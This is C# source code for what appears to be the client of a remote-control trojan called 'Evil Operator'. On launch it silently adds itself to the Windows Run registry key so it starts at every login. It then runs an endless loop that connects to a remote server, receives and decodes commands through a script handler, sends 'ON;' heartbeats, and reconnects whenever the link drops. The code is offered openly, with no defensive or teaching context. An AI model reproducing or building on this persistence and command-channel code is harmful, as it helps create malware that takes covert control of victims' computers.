using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Net.Sockets;
using System.Timers;
using System.Windows.Input;
using System.Threading;
using Microsoft.Win32;
using System.Windows.Forms;

namespace Evil_Operator
{
        class Program
        {
            public static Network net;
            public static Scripts script;
            static Thread netThread;
            public static string[] args;

            static void Main(string[] argz)
            {

                RegistryKey rk = Registry.CurrentUser.OpenSubKey
               ("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                rk.SetValue("Evil Operator", Application.ExecutablePath.ToString());
                args = argz;
                net = new Network();
                net.Start();
                net.packet = new Packet();
                net.packet.buffer = new byte[net.cSocket.SendBufferSize];
                Console.WriteLine("Packet buffer created.");
                script = new Scripts();
                script.packet = net.packet;
                netThread = new Thread(new ThreadStart(NetThread));
                netThread.Start();

            }
            public static void NetThread(/*Object sender, ElapsedEventArgs e*/)
            {
                Console.WriteLine("NetThread Started.");
                while (true)
                {
                    if (net != null)
                    {
                        if (net.cStream != null)
                        {
                            if(net.packet.TF== false)
                            {
                                if (net.cStream.DataAvailable)
                                {
                                    net.Recv();
                                    script.Decode();
                                    script.info.p_recv++;
                                }
                                else
                                {
                                    try
                                    {
                                        net.packet.strSend = "ON;";
                                        net.packet.ConvertSendtoByte();
                                        net.packet.Toggle();
                                        script.info.p_sent++;
                                    }
                                    catch(System.IO.IOException ex)
                                    {
                                        Console.WriteLine("Connection lost.");
                                        net.Disconnect();
                                        net.Start();
                                    }
                                }
                            }
                            else
                            {
                                try
                                {
                                    net.Send();
                                    net.packet.Toggle();
                                    script.info.p_sent++;
                                }
                                catch (System.IO.IOException ex)
                                {
                                    Console.WriteLine("Connection lost.");
                                    net.Disconnect();
                                    net.Start();
                                }
                            }
                        }
                        else
                        {
                        }

                    }
                    else
                    {
                        Console.WriteLine("Net Null");
                    }
                    Thread.Sleep(500);
                }
                Console.WriteLine("NetThread Ended");
            }
        }
}
